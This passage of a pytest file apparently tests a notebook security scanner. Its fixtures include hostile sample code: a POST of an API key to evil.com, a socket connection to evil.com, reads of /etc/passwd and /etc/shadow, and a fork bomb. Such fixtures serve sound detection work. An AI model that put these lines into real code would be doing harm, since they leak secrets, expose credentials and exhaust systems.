        repro_issues = [i for i in issues if "Reproducibility" in i.category and i.auto_fixable]
        assert len(repro_issues) >= 1

        fixer = NotebookFixer()
        success, fixes = fixer.fix_notebook(temp_notebook, repro_issues)

        assert success
        assert len(fixes) > 0

        with open(temp_notebook) as f:
            fixed_notebook = json.load(f)

        fixed_source = fixed_notebook["cells"][0]["source"]
        if isinstance(fixed_source, list):
            fixed_source = "".join(fixed_source)

        assert "manual_seed" in fixed_source or "seed" in fixed_source.lower()

        temp_notebook.unlink()

    def test_hugging_face_model_security(self, temp_notebook):
        """Test detection of Hugging Face model loading."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from transformers import AutoModel\n",
                        "model = AutoModel.from_pretrained('user/model')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        hf_issues = [
            i
            for i in issues
            if "Hugging Face" in i.message or "from_pretrained" in i.message.lower()
        ]
        assert len(hf_issues) >= 1
        assert any(i.severity in ["HIGH", "CRITICAL"] for i in hf_issues)

        temp_notebook.unlink()

    def test_data_validation_pandas(self, temp_notebook):
        """Test detection of pandas data loading without validation."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import pandas as pd\n",
                        "df = pd.read_csv('untrusted_data.csv')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        validation_issues = [i for i in issues if "Data Validation" in i.category]
        assert len(validation_issues) >= 1
        assert any("poisoning" in i.message.lower() for i in validation_issues)
        assert any(i.auto_fixable for i in validation_issues)

        temp_notebook.unlink()

    def test_entropy_calculation_accuracy(self):
        """Test entropy calculation for known strings."""
        analyzer = NotebookSecurityAnalyzer()

        # Low entropy: repeated characters
        low_entropy_text = "aaaaaaaaaa"
        low_entropy = analyzer._calculate_entropy(low_entropy_text)
        assert low_entropy < 1.0

        # High entropy: random-looking base64
        high_entropy_text = "aGlnaGVudHJvcHlzdHJpbmdmb3J0ZXN0aW5n"
        high_entropy = analyzer._calculate_entropy(high_entropy_text)
        assert high_entropy > 4.0

        # Medium entropy: regular text
        medium_entropy_text = "this is some regular text"
        medium_entropy = analyzer._calculate_entropy(medium_entropy_text)
        assert 2.0 < medium_entropy < 4.5


class TestFilesystemSecurity:
    """Tests for filesystem security checks."""

    def test_path_traversal_detection(self, temp_notebook):
        """Test detection of path traversal attempts."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "with open('../../../etc/passwd', 'r') as f:\n",
                        "    data = f.read()\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        fs_issues = [i for i in issues if "Filesystem Security" in i.category]
        assert len(fs_issues) >= 1
        assert any("traversal" in i.message.lower() for i in fs_issues)

        temp_notebook.unlink()

    def test_sensitive_file_access(self, temp_notebook):
        """Test detection of access to sensitive system files."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "with open('/etc/shadow', 'r') as f:\n",
                        "    passwords = f.read()\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        fs_issues = [i for i in issues if "Filesystem Security" in i.category]
        assert len(fs_issues) >= 1
        assert any(
            "shadow" in i.message.lower() or "password" in i.message.lower() for i in fs_issues
        )

        temp_notebook.unlink()

    def test_unsafe_file_deletion(self, temp_notebook):
        """Test detection of unsafe file deletion operations."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import os\n",
                        "os.remove('/tmp/important_file.txt')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        fs_issues = [
            i
            for i in issues
            if "Filesystem Security" in i.category and "remove" in i.message.lower()
        ]
        assert len(fs_issues) >= 1
        assert any(
            "deletion" in i.message.lower() or "path validation" in i.message.lower()
            for i in fs_issues
        )

        temp_notebook.unlink()

    def test_shutil_rmtree_detection(self, temp_notebook):
        """Test detection of shutil.rmtree without validation."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import shutil\n",
                        "shutil.rmtree('/tmp/data')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        fs_issues = [
            i
            for i in issues
            if "Filesystem Security" in i.category and "rmtree" in i.message.lower()
        ]
        assert len(fs_issues) >= 1

        temp_notebook.unlink()

    def test_tempfile_mktemp_deprecated(self, temp_notebook):
        """Test detection of deprecated tempfile.mktemp."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import tempfile\n",
                        "temp_path = tempfile.mkstemp(  # FIXED: Using secure mkstemp() instead of mktemp())\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        fs_issues = [
            i
            for i in issues
            if "Filesystem Security" in i.category and "mktemp" in i.message.lower()
        ]
        assert len(fs_issues) >= 1
        assert any(i.auto_fixable for i in fs_issues)
        assert any("race condition" in i.message.lower() for i in fs_issues)

        temp_notebook.unlink()


class TestAdvancedXSS:
    """Tests for advanced XSS detection."""

    def test_javascript_execution_detection(self, temp_notebook):
        """Test detection of JavaScript execution in outputs."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from IPython.display import Javascript\n",
                        "display(Javascript('alert(\"XSS\")'))\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        xss_issues = [i for i in issues if "XSS" in i.category]
        assert len(xss_issues) >= 1
        assert any("Javascript" in i.message or "JavaScript" in i.message for i in xss_issues)

        temp_notebook.unlink()

    def test_iframe_injection_detection(self, temp_notebook):
        """Test detection of iframe injection."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from IPython.display import HTML\n",
                        "HTML('<iframe src=\"https://evil.com\"></iframe>')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        xss_issues = [i for i in issues if "XSS" in i.category]
        # Should detect both HTML() usage and iframe pattern
        assert len(xss_issues) >= 1

        temp_notebook.unlink()


class TestNetworkExfiltration:
    """Tests for network and data exfiltration detection."""

    def test_http_post_detection(self, temp_notebook):
        """Test detection of HTTP POST requests."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import requests\n",
                        "data = {'secret': api_key}\n",
                        "requests.post('https://evil.com/collect', json=data)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        network_issues = [
            i for i in issues if "Network" in i.category or "Exfiltration" in i.category
        ]
        assert len(network_issues) >= 1
        assert any("POST" in i.message or "post" in i.code_snippet for i in network_issues)

        temp_notebook.unlink()

    def test_database_connection_detection(self, temp_notebook):
        """Test detection of database connections."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import psycopg2\n",
                        "conn = psycopg2.connect('postgresql://user:pass@host/db')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        network_issues = [
            i for i in issues if "Network" in i.category or "database" in i.message.lower()
        ]
        assert len(network_issues) >= 1

        temp_notebook.unlink()

    def test_raw_socket_detection(self, temp_notebook):
        """Test detection of raw socket access."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import socket\n",
                        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
                        "s.connect(('evil.com', 80))\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        network_issues = [
            i for i in issues if "Network" in i.category or "socket" in i.message.lower()
        ]
        assert len(network_issues) >= 1
        assert any(i.severity == "CRITICAL" for i in network_issues)

        temp_notebook.unlink()


class TestResourceExhaustion:
    """Tests for resource exhaustion detection."""

    def test_infinite_loop_detection(self, temp_notebook):
        """Test detection of infinite loops."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "while True:\n",
                        "    print('forever')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        resource_issues = [
            i for i in issues if "Resource Exhaustion" in i.category or "Infinite loop" in i.message
        ]
        assert len(resource_issues) >= 1
        assert any(i.severity == "CRITICAL" for i in resource_issues)

        temp_notebook.unlink()

    def test_large_memory_allocation(self, temp_notebook):
        """Test detection of large memory allocations."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "huge_list = [0] * 10**10  # 10 billion elements\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        resource_issues = [
            i
            for i in issues
            if "Resource Exhaustion" in i.category or "memory" in i.message.lower()
        ]
        assert len(resource_issues) >= 1

        temp_notebook.unlink()

    def test_fork_bomb_detection(self, temp_notebook):
        """Test detection of fork bomb patterns."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import os\n",
                        "while True:\n",
                        "    os.fork()\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        resource_issues = [
            i for i in issues if "Resource Exhaustion" in i.category or "fork" in i.message.lower()
        ]
        assert len(resource_issues) >= 1
        assert any(i.severity == "CRITICAL" for i in resource_issues)

        temp_notebook.unlink()


class TestAdvancedCodeInjection:
    """Tests for advanced code injection detection."""

    def test_dunder_method_access(self, temp_notebook):
        """Test detection of dunder method access."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "obj = 'test'\n",
                        "result = getattr(obj, '__class__').__bases__[0]\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        injection_issues = [
            i for i in issues if "Code Injection" in i.category and "dunder" in i.message.lower()
        ]
        assert len(injection_issues) >= 1
        assert any(i.severity == "CRITICAL" for i in injection_issues)

        temp_notebook.unlink()

    def test_ipython_run_cell_injection(self, temp_notebook):
        """Test detection of IPython run_cell injection."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from IPython import get_ipython\n",
                        "user_code = input('Enter code: ')\n",
                        "get_ipython().run_cell(user_code)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        injection_issues = [
            i for i in issues if "Code Injection" in i.category and "run_cell" in i.message.lower()
        ]
        assert len(injection_issues) >= 1

        temp_notebook.unlink()


class TestAdvancedMLSecurity:
    """Tests for advanced ML/AI security detection."""

    def test_prompt_injection_detection(self, temp_notebook):
        """Test detection of prompt injection vulnerabilities."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import openai\n",
                        "user_input = input('Query: ')\n",
                        "response = openai.ChatCompletion.create(\n",
                        "    model='gpt-4',\n",
                        "    messages=[{'role': 'user', 'content': 'System: ' + user_input}]\n",
                        ")\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        ml_issues = [i for i in issues if "ML" in i.category and "prompt" in i.message.lower()]
        assert len(ml_issues) >= 1
        assert any(i.severity == "CRITICAL" for i in ml_issues)

        temp_notebook.unlink()

    def test_adversarial_input_detection(self, temp_notebook):
        """Test detection of adversarial input risks."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "# Accept user input and use in model prediction\n",
                        "user_image = input('Upload image path: ')\n",
                        "prediction = model.predict(user_image)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should detect input() and/or .predict() in ML context
        ml_issues = [
            i
            for i in issues
            if "ML" in i.category
            or (
                "input" in i.message.lower()
                and "predict" in " ".join([iss.code_snippet for iss in issues]).lower()
            )
        ]
        # At minimum should detect input() usage
        input_issues = [i for i in issues if "input(" in i.code_snippet]
        assert len(ml_issues) >= 1 or len(input_issues) >= 1

        temp_notebook.unlink()


class TestSARIFGeneration:
    """Tests for SARIF report generation."""

    def test_generate_sarif_basic(self, temp_notebook):
        """Test basic SARIF generation."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "password = 'secret123'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))
        sarif = generate_notebook_sarif(str(temp_notebook), issues)

        # Verify SARIF structure
        assert sarif["version"] == "2.1.0"
        assert "$schema" in sarif
        assert "runs" in sarif
        assert len(sarif["runs"]) == 1

        run = sarif["runs"][0]
        assert "tool" in run
        assert "results" in run
        assert run["tool"]["driver"]["name"] == "PyGuard Notebook Security Analyzer"

        # Verify results
        assert len(run["results"]) > 0
        result = run["results"][0]
        assert "ruleId" in result
        assert "level" in result
        assert "message" in result
        assert "locations" in result

        temp_notebook.unlink()

    def test_sarif_includes_fixes(self, temp_notebook):
        """Test that SARIF includes fix suggestions."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "import torch\nmodel = torch.load('model.pth')",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))
        sarif = generate_notebook_sarif(str(temp_notebook), issues)

        run = sarif["runs"][0]
        # Find auto-fixable issues
        fixable_results = [r for r in run["results"] if "fixes" in r]
        assert len(fixable_results) > 0

        # Verify fix structure
        fix = fixable_results[0]["fixes"][0]
        assert "description" in fix
        assert "text" in fix["description"]

        temp_notebook.unlink()

    def test_sarif_severity_mapping(self, temp_notebook):
        """Test SARIF severity level mapping."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# Critical: eval\n",
                        "eval('test')\n",  # DANGEROUS: Avoid eval with untrusted input
                    ],
                    "outputs": [],
                    "metadata": {},
                },
                {
                    "cell_type": "code",
                    "execution_count": 2,
                    "source": [
                        "# Medium: unpinned\n",
                        "%pip install numpy\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                },
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))
        sarif = generate_notebook_sarif(str(temp_notebook), issues)

        run = sarif["runs"][0]
        levels = [r["level"] for r in run["results"]]

        # Should have both error (CRITICAL/HIGH) and warning (MEDIUM)
        # Test that we have multiple different severity levels
        assert len(set(levels)) >= 2, f"Expected multiple severity levels, got: {set(levels)}"
        # Check that at least one of the expected levels exists
        assert "error" in levels or "warning" in levels or "note" in levels

        temp_notebook.unlink()

    def test_sarif_rules_metadata(self, temp_notebook):
        """Test that SARIF includes proper rule metadata."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "password = 'supersecret123'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))
        sarif = generate_notebook_sarif(str(temp_notebook), issues)

        run = sarif["runs"][0]
        rules = run["tool"]["driver"]["rules"]

        assert len(rules) > 0
        rule = rules[0]

        # Verify rule structure
        assert "id" in rule
        assert "name" in rule
        assert "shortDescription" in rule
        assert "fullDescription" in rule
        assert "properties" in rule
        assert "help" in rule

        # Verify properties
        props = rule["properties"]
        assert "security-severity" in props
        assert "precision" in props
        assert "tags" in props
        assert "security" in props["tags"]
        assert "notebook" in props["tags"]

        temp_notebook.unlink()

    def test_sarif_cell_location_info(self, temp_notebook):
        """Test that SARIF includes notebook cell location info."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "api_key = 'sk-1234567890'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))
        sarif = generate_notebook_sarif(str(temp_notebook), issues)

        run = sarif["runs"][0]
        result = run["results"][0]

        # Verify cell-specific properties
        assert "properties" in result
        assert "cell_index" in result["properties"]
        assert result["properties"]["cell_index"] == 0

        # Verify location includes cell info
        location = result["locations"][0]
        assert "physicalLocation" in location
        assert "region" in location["physicalLocation"]

        temp_notebook.unlink()

    def test_sarif_empty_issues(self):
        """Test SARIF generation with no issues."""
        from pyguard.lib.notebook_security import generate_notebook_sarif

        sarif = generate_notebook_sarif("test.ipynb", [])

        assert sarif["version"] == "2.1.0"
        run = sarif["runs"][0]
        assert len(run["results"]) == 0
        assert run["properties"]["total_issues"] == 0

    def test_sarif_enhanced_metadata(self):
        """Test enhanced SARIF metadata with rollback commands and confidence scores."""
        from pyguard.lib.notebook_security import NotebookIssue, generate_notebook_sarif

        issues = [
            NotebookIssue(
                severity="CRITICAL",
                category="Code Injection",
                message="Use of eval() enables code injection",  # DANGEROUS: Avoid eval with untrusted input
                cell_index=0,
                line_number=1,
                code_snippet="eval(user_input)",  # DANGEROUS: Avoid eval with untrusted input
                rule_id="NB-INJECT-001",
                fix_suggestion="Use ast.literal_eval() for safe evaluation",  # DANGEROUS: Avoid eval with untrusted input
                cwe_id="CWE-95",
                owasp_id="ASVS-5.2.1",
                confidence=0.95,
                auto_fixable=True,
            )
        ]

        sarif = generate_notebook_sarif("test.ipynb", issues)

        # Check run properties include new metadata
        props = sarif["runs"][0]["properties"]
        assert "auto_fixable_issues" in props
        assert props["auto_fixable_issues"] == 1
        assert "high_confidence_issues" in props
        assert props["high_confidence_issues"] == 1
        assert "categories_detected" in props
        assert "Code Injection" in props["categories_detected"]
        assert props["sarif_enhanced"] is True
        assert props["includes_rollback_commands"] is True

        # Check result properties include enhanced metadata
        result = sarif["runs"][0]["results"][0]
        result_props = result["properties"]
        assert "fix_quality" in result_props
        assert result_props["fix_quality"] == "excellent"  # confidence >= 0.95
        assert "semantic_risk" in result_props
        assert result_props["semantic_risk"] == "low"  # confidence >= 0.9
        assert "cwe_id" in result_props
        assert result_props["cwe_id"] == "CWE-95"
        assert "owasp_id" in result_props
        assert result_props["owasp_id"] == "ASVS-5.2.1"

        # Check fix includes rollback commands
        assert "fixes" in result
        fix = result["fixes"][0]
        assert "properties" in fix
        fix_props = fix["properties"]
        assert "fix_confidence" in fix_props
        assert fix_props["fix_confidence"] == 0.95
        assert "rollback_command" in fix_props
        assert "backup_location" in fix_props
        assert "semantic_preservation" in fix_props
        assert fix_props["semantic_preservation"] == "verified"  # confidence >= 0.95

        # Check markdown description includes rollback command
        assert "Rollback Command" in fix["description"]["markdown"]
        assert "cp " in fix["description"]["markdown"]


class TestEnhancedMLPatterns:
    """Test enhanced ML/AI security pattern detection."""

    def test_tensorflow_model_loading_detection(self, temp_notebook):
        """Test detection of TensorFlow model loading patterns."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import tensorflow as tf\n",
                        "# Load TensorFlow SavedModel\n",
                        "model = tf.saved_model.load('my_model')\n",
                        "# Load Keras model from JSON\n",
                        "model2 = tf.keras.models.model_from_json(json_config)",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should detect TensorFlow model loading
        ml_issues = [i for i in issues if i.category == "ML Pipeline Security"]
        assert len(ml_issues) >= 2, f"Expected at least 2 TensorFlow issues, got {len(ml_issues)}"

        # Check for SavedModel and model_from_json
        patterns_found = [i.message for i in ml_issues]
        assert any("SavedModel" in msg or "saved_model" in msg for msg in patterns_found)
        assert any("JSON" in msg or "json" in msg for msg in patterns_found)

        temp_notebook.unlink()

    def test_onnx_model_detection(self, temp_notebook):
        """Test detection of ONNX model loading."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import onnx\n",
                        "import onnxruntime\n",
                        "# Load ONNX model\n",
                        "model = onnx.load('model.onnx')\n",
                        "session = onnxruntime.InferenceSession('model.onnx')",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        ml_issues = [i for i in issues if i.category == "ML Pipeline Security"]
        assert len(ml_issues) >= 2
        assert any("ONNX" in i.message for i in ml_issues)

        temp_notebook.unlink()

    def test_huggingface_automodel_detection(self, temp_notebook):
        """Test detection of Hugging Face AutoModel loading."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from transformers import AutoModel, pipeline\n",
                        "# Load AutoModel\n",
                        "model = AutoModel.from_pretrained('bert-base-uncased')\n",
                        "# Use pipeline with custom model\n",
                        "pipe = pipeline('sentiment-analysis', model='untrusted/model')",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        ml_issues = [i for i in issues if i.category == "ML Pipeline Security"]
        assert len(ml_issues) >= 2
        assert any("AutoModel" in i.message or "pipeline" in i.message for i in ml_issues)

        temp_notebook.unlink()


class TestComplianceLicensing:
    """Test compliance and licensing pattern detection."""

    def test_gpl_dependency_detection(self, temp_notebook):
        """Test detection of GPL-licensed dependencies."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# Using GPL-licensed library\n",
                        "from some_gpl_lib import feature  # GPL\n",
                        "import another_lib  # GPL-3.0",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        compliance_issues = [i for i in issues if i.category == "Compliance & Licensing"]
        assert len(compliance_issues) >= 1
        assert any("GPL" in i.message for i in compliance_issues)

        temp_notebook.unlink()

    def test_cryptography_export_control(self, temp_notebook):
        """Test detection of cryptographic libraries with export restrictions."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from cryptography import fernet\n",
                        "import pycrypto\n",
                        "from nacl import secret",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        compliance_issues = [i for i in issues if i.category == "Compliance & Licensing"]
        assert len(compliance_issues) >= 1
        assert any(
            "cryptography" in i.message.lower() or "export" in i.message.lower()
            for i in compliance_issues
        )

        temp_notebook.unlink()


class TestEnhancedNetworkPatterns:
    """Test enhanced network exfiltration patterns."""

    def test_graphql_detection(self, temp_notebook):
        """Test detection of GraphQL operations."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from gql import gql, Client\n",
                        "import graphql\n",
                        "query = gql('{ users { id name } }')\n",
                        "result = client.execute(query)",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        network_issues = [i for i in issues if i.category == "Network & Data Exfiltration"]
        assert len(network_issues) >= 1
        assert any("GraphQL" in i.message or "gql" in i.message for i in network_issues)

        temp_notebook.unlink()

    def test_dns_resolver_detection(self, temp_notebook):
        """Test detection of DNS resolver operations."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import dns.resolver\n",
                        "import dnspython\n",
                        "resolver = dns.resolver.Resolver()\n",
                        "answers = resolver.query('example.com', 'A')",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }

        with open(temp_notebook, "w", encoding="utf-8") as f:
            json.dump(notebook, f)

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        network_issues = [i for i in issues if i.category == "Network & Data Exfiltration"]
        assert len(network_issues) >= 1
        assert any("DNS" in i.message for i in network_issues)

        temp_notebook.unlink()


class TestEnhancedPIIPatterns:
    """Test enhanced PII detection patterns."""

    def test_iban_swift_detection(self, temp_notebook):
        """Test detection of IBAN and SWIFT codes."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# Banking information\n",
                        "iban = 'GB82WEST12345698765432'\n",
                        "swift = 'DEUTDEFF500'",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
